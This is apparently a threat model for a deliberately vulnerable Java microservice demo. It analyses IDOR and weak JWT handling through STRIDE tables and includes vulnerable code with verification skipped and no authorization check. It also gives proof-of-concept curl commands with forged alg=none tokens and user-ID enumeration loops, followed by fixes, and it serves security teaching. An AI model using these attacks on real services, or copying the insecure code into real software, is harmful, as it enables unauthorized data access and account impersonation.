# Threat Model: IDOR and Weak JWT in Microservice API

## Executive Summary

This document presents a comprehensive threat model for a microservice API demonstrating two critical OWASP Top 10 vulnerabilities: **Insecure Direct Object Reference (IDOR)** and **Weak JWT Handling**. The analysis follows the STRIDE methodology to identify threats, vulnerabilities, and their security impact.

---

## 1. System Architecture

### 1.1 Architecture Diagram

```
┌──────────────────────────────────────────────────────────────────────────────┐
│                              NETWORK BOUNDARY                                │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                               │
│  ┌──────────────┐                ┌──────────────────────┐                    │
│  │   Client     │                │   Attacker Client    │                    │
│  │  (curl/app)  │                │  (exploit scripts)   │                    │
│  └──────┬───────┘                └──────────┬───────────┘                    │
│         │                                    │                               │
│         │ HTTP/HTTPS                         │ HTTP/HTTPS                     │
│         │ POST /login                        │ GET /users/{id}/docs (IDOR)   │
│         │ GET /users/{id}/docs               │ Forged JWT (alg=none)         │
│         │ GET /health                        │                               │
│         │ GET /                              │                               │
│         │                                    │                               │
│         └────────────────────┬───────────────┘                               │
│                              │                                                │
│                    ┌─────────▼──────────┐                                     │
│                    │  Spring Boot API   │                                     │
│                    │  Server (Java 17)  │                                     │
│                    ├───────────────────┤                                     │
│                    │ JwtAuthFilter      │                                     │
│                    │ └─ decodeToken()   │ ◄─ VULN: Accepts alg=none         │
│                    │                   │ ◄─ VULN: Uses weak secret          │
│                    ├───────────────────┤                                     │
│                    │ ApiController      │                                     │
│                    │ └─ getUserDocs()   │ ◄─ VULN: No authz check (IDOR)    │
│                    │ └─ login()         │ ◄─ AUTH: Token generation         │
│                    ├───────────────────┤                                     │
│                    │ Spring Data JPA    │                                     │
│                    │ UserRepository     │                                     │
│                    └─────────┬──────────┘                                     │
│                              │                                                │
│                    ┌─────────▼──────────┐                                     │
│                    │   PostgreSQL DB    │                                     │
│                    │ (port 5432)        │                                     │
│                    ├───────────────────┤                                     │
│                    │ users (id, name)   │                                     │
│                    │ documents (id, uid)│                                     │
│                    └───────────────────┘                                     │
│                                                                               │
└──────────────────────────────────────────────────────────────────────────────┘
```

### 1.2 Data Flow in Vulnerable Mode

**Attack Flow 1: IDOR Exploitation**

```
Alice (user_id=1)
  ↓
POST /login → Gets JWT(user_id=1, role=user)
  ↓
GET /users/2/docs + JWT(1) → No authz check → Returns Bob's docs (IDOR!)
```

**Attack Flow 2: JWT Forgery**

```
Attacker
  ↓
Crafts JWT with alg=none, user_id=1, role=admin
  ↓
Server accepts (no sig verification) → Attacker impersonates admin
```

---

## 2. STRIDE Threat Analysis Matrix

| STRIDE Category            | Threat                                               | CWE         | CVSS         | Component                   | Impact                               | Likelihood | Status    |
| -------------------------- | ---------------------------------------------------- | ----------- | ------------ | --------------------------- | ------------------------------------ | ---------- | --------- |
| **Spoofing**               | Attacker forges JWT with alg=none                    | CWE-347     | 9.1 CRITICAL | JwtUtil.decodeToken()       | Attacker impersonates any user/admin | High       | ✓ Fixed   |
| **Spoofing**               | Weak JWT secret is brute-forced                      | CWE-521     | 7.5 HIGH     | JwtUtil secret key          | Attacker generates valid tokens      | Medium     | ✓ Fixed   |
| **Tampering**              | Attacker modifies JWT payload (user_id, role)        | CWE-347     | 8.2 HIGH     | JwtUtil.decodeToken()       | Privilege escalation                 | High       | ✓ Fixed   |
| **Tampering**              | Token payload exposed in HTTP response               | CWE-200     | 5.3 MEDIUM   | UserDocsResponse            | Information disclosure               | High       | ✓ Fixed   |
| **Repudiation**            | User denies accessing other's documents              | —           | —            | —                           | Non-repudiation weakness             | Low        | N/A       |
| **Information Disclosure** | IDOR: Access other users' documents                  | CWE-639     | 9.1 CRITICAL | ApiController.getUserDocs() | Unauthorized data access             | High       | ✓ Fixed   |
| **Information Disclosure** | Enumeration of user IDs via 404 messages             | CWE-204     | 5.3 MEDIUM   | ApiController               | User enumeration                     | Medium     | Partial   |
| **Denial of Service**      | Brute-force JWT secret offline                       | CWE-521     | 5.9 MEDIUM   | JwtUtil secret              | Token forgery                        | Medium     | ✓ Fixed   |
| **Denial of Service**      | No rate limiting on /login endpoint                  | CWE-770     | 6.5 MEDIUM   | ApiController.login()       | Credential stuffing                  | Medium     | Not Fixed |
| **Elevation of Privilege** | IDOR → Read admin's documents (if exists)            | CWE-639     | 9.1 CRITICAL | ApiController.getUserDocs() | Privilege escalation                 | High       | ✓ Fixed   |
| **Elevation of Privilege** | Weak JWT secret allows privilege escalation to admin | CWE-347+521 | 9.1 CRITICAL | JwtUtil                     | Attacker becomes admin               | High       | ✓ Fixed   |

---

## 3. Detailed Threat Analysis

### 3.1 CWE-347: Improper Verification of Cryptographic Signature

**Severity:** CRITICAL (CVSS 9.1)

**Description:**
The application fails to properly validate JWT signatures in vulnerable mode, accepting tokens without signature verification. This allows attackers to forge arbitrary tokens with any claims.

**How It Manifests in Our Code:**

```java
// VULNERABLE CODE (JwtUtil.java:96-100)
if (appConfig.isVulnerableMode()) {
    return Jwts.parser()
            .unsecured()              // ◄ CRITICAL: Skip verification
            .build()
            .parseUnsecuredClaims(token)
            .getPayload();
}
```

**Attack Vector:**

1. **alg=none Exploit:** Attacker creates token with algorithm header set to "none":

   ```json
   Header:  {"alg":"none"}
   Payload: {"user_id":1,"username":"alice","role":"admin"}
   Signature: (empty)
   ```

   Server accepts it because verification is skipped.

2. **Token Modification:** Attacker intercepts valid JWT and modifies payload:
   ```
   Original: eyJ...{"user_id":1,"role":"user"}...
   Modified: eyJ...{"user_id":1,"role":"admin"}...
   Signature: (regenerated without key knowledge)
   ```
   Server accepts it because signature isn't validated.

**Impact on CIA Triad:**

- **Confidentiality:** ◆◆◆◆◆ HIGH — Attacker reads any user's data
- **Integrity:** ◆◆◆◆◆ HIGH — Token claims are untrustworthy
- **Availability:** ◆◆ LOW — No direct DoS impact

**Exploitation Proof-of-Concept:**

```bash
# Create unsigned token
UNSIGNED_TOKEN="eyJhbGciOiJub25lIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6ImFkbWluIn0."

# Server accepts it in VULN mode
curl http://localhost:5001/users/2/docs \
  -H "Authorization: Bearer $UNSIGNED_TOKEN"
# ✓ Returns Bob's documents (should be forbidden)
```

**OWASP Mapping:**

- OWASP A02:2021 — Cryptographic Failures
- OWASP A07:2021 — Identification and Authentication Failures

---

### 3.2 CWE-521: Weak Cryptography Key

**Severity:** HIGH (CVSS 7.5)

**Description:**
The application uses a weak, short, predictable secret key for JWT signing ("weak_secret_123"). This allows offline brute-force attacks to forge valid tokens.

**How It Manifests:**

```java
// VULNERABLE CODE (JwtUtil.java:54-56)
String secret = appConfig.isVulnerableMode()
    ? appConfig.getWeakSecret()  // "weak_secret_123" (18 chars)
    : appConfig.getStrongSecret();  // 32+ chars
```

**Attack Vector:**

1. **Offline Brute-Force:** Attacker captures valid JWT token and attempts to brute-force the secret:

   ```python
   for secret_candidate in ["password123", "weak_secret_123", "admin", ...]:
       if verify_signature(token, secret_candidate):
           print(f"Found secret: {secret_candidate}")
           # Now can forge arbitrary tokens
   ```

2. **Known Secret Dictionary:** Common weak secrets are in public wordlists. "weak_secret_123" would be cracked in seconds with tools like `hashcat`.

3. **Dictionary Attack:** Given HMAC-SHA256 of known payload, attacker tests dictionary:
   ```bash
   echo -n "payload" | openssl dgst -sha256 -hmac "weak_secret_123"
   ```

**Impact:**

- **Confidentiality:** ◆◆◆◆◆ HIGH
- **Integrity:** ◆◆◆◆◆ HIGH
- **Availability:** ◆◆ LOW

**Exploitation Proof-of-Concept:**

```bash
# Attacker intercepts token
TOKEN=$(curl -s -X POST http://localhost:5001/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice"}' | jq -r '.access_token')

# Brute-force the secret (would find "weak_secret_123")
python poc/bruteforce_jwt.py "$TOKEN"
# ✓ Found secret, can now forge tokens
```

**OWASP Mapping:**

- OWASP A02:2021 — Cryptographic Failures
- OWASP A04:2021 — Insecure Design

---

### 3.3 CWE-639: Insecure Direct Object Reference (IDOR)

**Severity:** CRITICAL (CVSS 9.1)

**Description:**
The `/users/{userId}/docs` endpoint returns user documents without verifying that the authenticated user has authorization to access those specific documents. Any authenticated user can access any other user's documents by changing the URL parameter.

**How It Manifests:**

```java
// VULNERABLE CODE (ApiController.java:154-176)
if (appConfig.isVulnerableMode()) {
    // NO AUTHORIZATION CHECK! Any authenticated user can access any docs
    logger.warn("VULN MODE: Returning documents without authorization check");

    List<String> docNames = user.getDocs().stream()
            .map(Document::getFilename)
            .collect(Collectors.toList());

    return ResponseEntity.ok(response);  // ◄ Returns without checking ownership
}
```

**Attack Vector:**

1. **Parameter Tampering:** Alice logs in and receives JWT with her user_id:

   ```
   Alice: GET /users/1/docs → Returns [alice_passport.pdf, alice_contract.pdf] ✓
   Attacker (as Alice): GET /users/2/docs → Returns [bob_id_card.pdf, bob_bank_statement.pdf] ✗ IDOR!
   Attacker (as Alice): GET /users/5/docs → Returns [victim_secret_document.pdf] ✗ IDOR!
   ```

2. **Progressive Enumeration:** Attacker iterates through user IDs to extract all documents:

   ```bash
   for id in {1..100}; do
       curl http://localhost:5001/users/$id/docs \
         -H "Authorization: Bearer $TOKEN" | jq '.documents'
   done
   # Collects all users' documents
   ```

3. **Sensitive Data Breach:** Attacker accesses documents containing:
   - Personal ID cards (CWE-200: Information Exposure)
   - Bank statements (financial data)
   - Medical records (healthcare data)
   - Confidential contracts (business secrets)

**Impact:**

- **Confidentiality:** ◆◆◆◆◆ CRITICAL — Complete unauthorized data access
- **Integrity:** ◆ LOW — No data modification (read-only)
- **Availability:** ◆ LOW — No service disruption

**Exploitation Proof-of-Concept:**

```bash
# Login as Alice
TOKEN=$(curl -s -X POST http://localhost:5001/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice"}' | jq -r '.access_token')

# Alice's documents (authorized)
curl http://localhost:5001/users/1/docs \
  -H "Authorization: Bearer $TOKEN"
# ✓ Returns alice's documents

# Bob's documents (NOT authorized - IDOR vulnerability!)
curl http://localhost:5001/users/2/docs \
  -H "Authorization: Bearer $TOKEN"
# ✓ Returns bob's documents (should be 403 Forbidden!)

# Victim's documents (NOT authorized)
curl http://localhost:5001/users/5/docs \
  -H "Authorization: Bearer $TOKEN"
# ✓ Returns victim's documents (BREACH!)
```

**OWASP Mapping:**

- OWASP A01:2021 — Broken Access Control
- OWASP A04:2021 — Insecure Design

---

### 3.4 CWE-200: Information Exposure Through Response

**Severity:** MEDIUM (CVSS 5.3)

**Description:**
The vulnerable mode includes the entire JWT token payload in the API response, exposing sensitive information about the authentication mechanism and token structure to attackers.

**How It Manifests:**

```java
// VULNERABLE CODE (ApiController.java:164-174)
Map<String, Object> tokenPayload = new HashMap<>();
tokenPayload.put("user_id", tokenUserId);
tokenPayload.put("username", jwtUtil.getUsername(claims));
tokenPayload.put("role", tokenRole);

UserDocsResponse response = new UserDocsResponse(
    user.getId(),
    user.getUsername(),
    docNames,
    tokenPayload  // ◄ Exposes token internals!
);
```

**Response Example:**

```json
{
  "user_id": 1,
  "username": "alice",
  "documents": ["file1.pdf", "file2.pdf"],
  "token_payload": {
    "user_id": 1,
    "username": "alice",
    "role": "user"
  }
}
```

**Impact:** Information helps attacker understand token structure for forgery attacks.

**OWASP Mapping:**

- OWASP A01:2021 — Broken Access Control
- OWASP A04:2021 — Insecure Design

---

## 4. Attack Scenarios

### Scenario 1: Privilege Escalation via Forged JWT

**Attacker Goal:** Become admin and access all documents

**Steps:**

1. Attacker creates unsigned JWT with role=admin:

   ```json
   {"alg":"none"}
   {"user_id":999,"username":"hacker","role":"admin"}
   (no signature)
   ```

2. Attacker calls GET /users/1/docs with forged token:

   ```bash
   curl http://localhost:5001/users/1/docs \
     -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyX2lkIjo5OTksInVzZXJuYW1lIjoiaGFja2VyIiwicm9sZSI6ImFkbWluIn0."
   ```

3. Server accepts (no sig verification), attacker is admin:

   ```json
   {
     "user_id": 1,
     "username": "alice",
     "documents": ["...all alice's docs..."],
     "token_payload": { "user_id": 999, "username": "hacker", "role": "admin" }
   }
   ```

4. Attacker can now access ANY user's documents as admin:
   ```bash
   curl http://localhost:5001/users/2/docs
   curl http://localhost:5001/users/3/docs
   curl http://localhost:5001/users/5/docs  # victim
   ```

**Result:** Complete unauthorized access to all sensitive data.

---

### Scenario 2: Data Breach via IDOR

**Attacker Goal:** Steal all user documents

**Steps:**

1. Attacker logs in as low-privilege user:

   ```bash
   TOKEN=$(curl -s -X POST http://localhost:5001/login \
     -H "Content-Type: application/json" \
     -d '{"username":"charlie"}' | jq -r '.access_token')
   ```

2. Attacker iterates through user IDs 1-10:

   ```bash
   for id in {1..10}; do
       curl http://localhost:5001/users/$id/docs \
         -H "Authorization: Bearer $TOKEN" | jq '.documents'
   done
   ```

3. Attacker collects:
   - Alice's: passport.pdf, contract.pdf
   - Bob's: id_card.pdf, bank_statement.pdf, medical_record.pdf
   - Victim's: secret_document.pdf, private_info.pdf

4. Total Data Compromised: All 8 documents × 3 users = 24 files accessible to single attacker

**Result:** Massive data breach affecting all users.

---

## 5. Remediation Summary

| Threat                | CWE     | Fix                                                                        | Status  |
| --------------------- | ------- | -------------------------------------------------------------------------- | ------- |
| Forged JWT (alg=none) | CWE-347 | Use `Jwts.parser().verifyWith(key)` instead of `.unsecured()`              | ✓ FIXED |
| Weak JWT secret       | CWE-521 | Use 32+ character secret from environment variable                         | ✓ FIXED |
| IDOR vulnerability    | CWE-639 | Add `if (!userId.equals(tokenUserId) && !"admin".equals(tokenRole))` check | ✓ FIXED |
| Information Exposure  | CWE-200 | Remove tokenPayload from response (set to null)                            | ✓ FIXED |

**Verification in FIXED Mode:**

```bash
MODE=FIXED docker-compose -f docker-compose-java.yml up --build

# Forged JWT rejected
curl http://localhost:5001/users/1/docs \
  -H "Authorization: Bearer eyJhbGciOiJub25lIn0...."
# ✗ 401 Unauthorized

# IDOR blocked
TOKEN=$(curl -s -X POST http://localhost:5001/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice"}' | jq -r '.access_token')

curl http://localhost:5001/users/2/docs \
  -H "Authorization: Bearer $TOKEN"
# ✗ 403 Forbidden (correct!)
```

---

## 6. References

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [CWE-639: Insecure Direct Object Reference](https://cwe.mitre.org/data/definitions/639.html)
- [CWE-347: Improper Verification of Cryptographic Signature](https://cwe.mitre.org/data/definitions/347.html)
- [CWE-521: Weak Cryptography Key](https://cwe.mitre.org/data/definitions/521.html)
- [JWT Best Practices (RFC 8725)](https://tools.ietf.org/html/rfc8725)
- [PVS-Studio Documentation](https://pvs-studio.com/en/docs/)
